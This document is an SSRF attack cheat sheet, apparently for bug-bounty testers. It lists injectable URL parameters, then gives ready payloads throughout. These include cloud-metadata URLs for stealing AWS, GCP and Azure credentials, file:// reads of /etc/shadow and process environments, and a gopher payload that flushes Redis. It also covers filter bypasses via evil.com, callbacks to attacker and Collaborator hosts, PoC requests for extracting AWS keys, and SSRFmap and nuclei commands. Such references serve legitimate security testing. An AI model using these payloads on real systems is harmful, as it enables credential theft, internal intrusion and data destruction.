# SSRF - Server-Side Request Forgery

## What Is It
Server makes HTTP requests to attacker-controlled destinations.
Server trusts itself → attacker abuses that trust.

---

## Features / Where to Find
- Any parameter accepting a URL: `?url=`, `?webhook=`, `?callback=`, `?redirect=`, `?src=`, `?href=`, `?uri=`, `?path=`, `?dest=`
- PDF generators (wkhtmltopdf, Puppeteer)
- Image fetchers / avatar upload by URL
- Webhook configurations
- Import from URL (CSV, XML, JSON)
- OAuth callback URLs
- "Fetch preview" or "link preview" features
- File converters
- Health check / ping endpoints
- JIRA, Confluence integrations
- XML/SOAP requests with external entities

---

## Actions / Attack Techniques

### 1. Internal Network Scanning
```
http://127.0.0.1/
http://localhost/
http://192.168.1.1/
http://10.0.0.1/
http://172.16.0.1/
```

### 2. Cloud Metadata (CRITICAL)
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header required: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header required: Metadata: true

# DigitalOcean
http://169.254.169.254/metadata/v1/
```

### 3. Internal Services
```
http://127.0.0.1:8080/     # Dev server
http://127.0.0.1:8443/     # Dev HTTPS
http://127.0.0.1:9200/     # Elasticsearch
http://127.0.0.1:6379/     # Redis
http://127.0.0.1:27017/    # MongoDB
http://127.0.0.1:5432/     # PostgreSQL
http://127.0.0.1:3306/     # MySQL
http://127.0.0.1:11211/    # Memcached
http://127.0.0.1:8500/     # Consul
http://127.0.0.1:4001/     # etcd
```

### 4. Protocol Schemes
```
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO
ftp://127.0.0.1/
sftp://attacker.com/
```

### 5. SSRF via Gopher (Redis RCE)
```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
```

---

## Bypass Techniques

### IP Obfuscation
```
http://2130706433/          # Decimal of 127.0.0.1
http://0x7f000001/          # Hex
http://127.1/               # Short form
http://[::1]/               # IPv6
http://[::ffff:127.0.0.1]/  # IPv6 mapped
http://0/                   # Shorthand
http://127.000.000.001/     # Padding
```

### DNS Rebinding
```
# Use: https://lock.cmpxchg8b.com/rebinder.html
# Or: nip.io, xip.io
http://127.0.0.1.nip.io/
```

### URL Parser Confusion
```
http://evil.com@127.0.0.1/
http://127.0.0.1#@evil.com/
http://127.0.0.1?.evil.com
http://evil.com/redirect?url=http://127.0.0.1
```

### Double URL Encoding
```
http://127.0.0.1/%2561dmin   # %25 = %
http://%31%32%37%2e%30%2e%30%2e%31/
```

---

## Threat Model
- **Internal network access** → scan internal services
- **Cloud metadata theft** → AWS keys → full account takeover
- **RCE via Redis/Memcached** → write webshell
- **Port scanning** → map internal network
- **File read** → via file:// protocol
- **Bypass IP whitelisting** → internal API access

---

## PoC Examples

### Basic SSRF PoC
```http
GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: target.com
```

### Blind SSRF (use Burp Collaborator / interactsh)
```http
GET /fetch?url=http://YOUR.burpcollaborator.net/ HTTP/1.1
Host: target.com
```

### SSRF → AWS Keys
```http
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
# Response shows role name, then:
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE HTTP/1.1
# Response: AccessKeyId, SecretAccessKey, Token
```

---

## Tools
```bash
# SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Interactsh for blind SSRF
interactsh-client
# Use your interactsh URL in the parameter

# Nuclei SSRF templates
nuclei -u https://target.com -t ssrf/
```

---

## Report Template
**Title:** SSRF in [parameter] allows access to [internal resource]
**Severity:** Critical (if cloud metadata) / High
**Impact:** Internal network access, potential AWS key theft, RCE
